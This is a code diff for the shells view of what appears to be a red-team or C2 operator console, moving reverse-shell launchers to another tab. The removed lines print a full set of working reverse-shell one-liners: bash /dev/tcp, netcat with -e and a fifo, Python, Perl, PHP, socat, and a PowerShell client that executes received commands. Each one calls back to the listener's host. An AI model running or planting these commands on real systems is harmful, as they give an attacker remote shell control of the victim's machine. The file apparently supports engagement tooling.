@@ -10,65 +10,9 @@ import { StatusBadge } from '../components/StatusBadge'
 // tick (a shell joining or leaving the roster bumps it) with a slow poll as
 // reconciliation; selecting a shell opens the console under the table.
 //
-// Catching starts here too: each shellcatch listener renders its paste-ready
-// catch one-liners above the table, derived from the listener's public
-// endpoint -- the field's whole purpose, since that endpoint is the address
-// the target dials. The render is advisory like the console's Upgrade
-// launchers: the operator pastes it on the target, the arrival lands in the
-// roster below.
-
-// The paste-ready catch one-liners for one shellcatch listener's public
-// endpoint (stored host:port): the classic documented reverse-shell shapes
-// across the interpreter families a target is likely to have, mirroring the
-// console's Upgrade launcher rendering. Pure rendering of (host, port) into
-// commands -- no credential is minted, so the client renders from the roster
-// it already holds.
-function catchLaunchers(
-  publicEndpoint: string,
-): { id: string; os: string; command: string }[] {
-  const hostPort = publicEndpoint.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '')
-  const colon = hostPort.lastIndexOf(':')
-  if (colon <= 0 || colon === hostPort.length - 1) return []
-  const host = hostPort.slice(0, colon).replace(/^\[/, '').replace(/\]$/, '')
-  const port = hostPort.slice(colon + 1)
-  if (!/^\d+$/.test(port)) return []
-  const fifo = '/tmp/.rod-catch'
-  return [
-    { id: 'unix-bash', os: 'linux', command: `bash -i >& /dev/tcp/${host}/${port} 0>&1` },
-
-    // The -e flag belongs to traditional/GNU netcat; the OpenBSD build
-    // refuses it, so the fifo shape (a /bin/sh over the pipe) rides beside
-    // it. Showing both costs nothing while a missing one costs a round trip.
-    { id: 'unix-nc', os: 'linux', command: `nc -e /bin/sh ${host} ${port}` },
-    {
-      id: 'unix-nc-fifo',
-      os: 'linux',
-      command: `rm -f ${fifo}; mkfifo ${fifo}; cat ${fifo} | /bin/sh -i 2>&1 | nc ${host} ${port} > ${fifo}`,
-    },
-
-    { id: 'unix-python', os: 'linux', command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
-
-    { id: 'unix-perl', os: 'linux', command: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
-
-    { id: 'unix-php', os: 'linux', command: `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
-
-    { id: 'unix-socat', os: 'linux', command: `socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:${host}:${port}` },
-
-    {
-      id: 'windows-powershell',
-      os: 'windows',
-      command:
-        `powershell -c "$c=New-Object Net.Sockets.TCPClient('${host}',${port});` +
-        `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};` +
-        `while(($i=$s.Read($b,0,$b.Length)) -ne 0){` +
-        `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);` +
-        `$o=(iex $d 2>&1|Out-String);` +
-        `$r=$o+'PS '+(pwd).Path+'> ';` +
-        `$q=[text.encoding]::ASCII.GetBytes($r);` +
-        `$s.Write($q,0,$q.Length);$s.Flush()};$c.Close()"`,
-    },
-  ]
-}
+// The paste-ready catch one-liners live one tab over, under Launchers --
+// the one home for every command an operator copies out. This view is the
+// roster they land in.
 
 export function ShellsView({
   engagementId,
@@ -82,7 +26,6 @@ export function ShellsView({
   const [webListeners, setWebListeners] = useState<ListenerSummary[]>([])
   const [selectedId, setSelectedId] = useState<string | null>(null)
   const [error, setError] = useState<string | null>(null)
-  const [copied, setCopied] = useState<string | null>(null)
 
   const refresh = useCallback(async () => {
     try {
@@ -97,10 +40,10 @@ export function ShellsView({
     void refresh()
   }, [refresh, onlineTick])
 
-  // The shellcatch listeners (the catch one-liners) and the web listeners
-  // (the console's upgrade fetch fronts): loaded with the roster's tick
-  // rather than the slow poll -- listeners change rarely, and the panels
-  // only need to exist, not to reconcile.
+  // The shellcatch listeners (the catch one-liners' home) and the web
+  // listeners (the console's upgrade fetch fronts): loaded with the roster's
+  // tick rather than the slow poll -- listeners change rarely, and the
+  // surfaces that read them only need to exist, not to reconcile.
   useEffect(() => {
     void (async () => {
       try {
@@ -108,7 +51,7 @@ export function ShellsView({
         setCatchers(all.filter((l) => l.transport === 'shellcatch'))
         setWebListeners(all.filter((l) => ['http', 'https', 'mtls'].includes(l.transport)))
       } catch {
-        // A failed load leaves the panels absent; the roster above still works.
+        // A failed load leaves the hint generic; the roster above still works.
       }
     })()
   }, [engagementId, onlineTick])
@@ -129,17 +72,6 @@ export function ShellsView({
   // the transcript is the working view, the audit trail is the record.
   const onEnded = useCallback(() => void refresh(), [refresh])
 
-  const copy = async (id: string, text: string) => {
-    try {
-      await navigator.clipboard.writeText(text)
-      setCopied(id)
-      window.setTimeout(() => setCopied(null), 1500)
-    } catch {
-      // Clipboard permission denied: the command stays selectable to copy
-      // by hand.
-    }
-  }
-
   return (
     <section className="view">
       <h2>Shells</h2>
@@ -150,36 +82,13 @@ export function ShellsView({
       </p>
       {error && <p className="error">{error}</p>}
 
-      {catchers.map((listener) => {
-        const launchers = catchLaunchers(listener.publicEndpoint)
-        if (launchers.length === 0) return null
-        return (
-          <details key={listener.id} className="catch-details">
-            <summary title="The paste-ready reverse-shell one-liners for this listener's public endpoint — expand to copy one">
-              Catch on <code>{listener.name}</code> · <code>{listener.publicEndpoint}</code>
-              <span className="muted"> — {launchers.length} one-liners</span>
-            </summary>
-            <div className="upgrade-panel">
-              <p>
-                Paste one of these on the target; the shell lands in the roster below. The address
-                is the listener's public endpoint — what the target dials.
-              </p>
-              {launchers.map((launcher) => (
-                <div key={launcher.id} className="upgrade-launcher">
-                  <code>{launcher.id}</code>
-                  <code className="upgrade-command">{launcher.command}</code>
-                  <button
-                    className="ghost sm"
-                    onClick={() => void copy(launcher.id, launcher.command)}
-                  >
-                    {copied === launcher.id ? 'Copied' : 'Copy'}
-                  </button>
-                </div>
-              ))}
-            </div>
-          </details>
-        )
-      })}
+      {catchers.length > 0 && (
+        <p className="muted">
+          Paste-ready catch one-liners live under{' '}
+          <a href={`#/engagements/${engagementId}/launchers`}>Launchers</a> — copy one there,
+          paste it on the target, and the shell lands in this roster.
+        </p>
+      )}
 
       <div className="table-wrap">
         <table>
@@ -201,7 +110,7 @@ export function ShellsView({
                   <div className="empty">
                     <Icon name="terminal" />
                     {catchers.length > 0
-                      ? 'No shells caught yet -- open a catch panel above and paste a one-liner on the target.'
+                      ? 'No shells caught yet -- copy a catch one-liner under Launchers and paste it on the target.'
                       : 'No shells caught yet -- create a shellcatch listener under Listeners first.'}
                   </div>
                 </td>
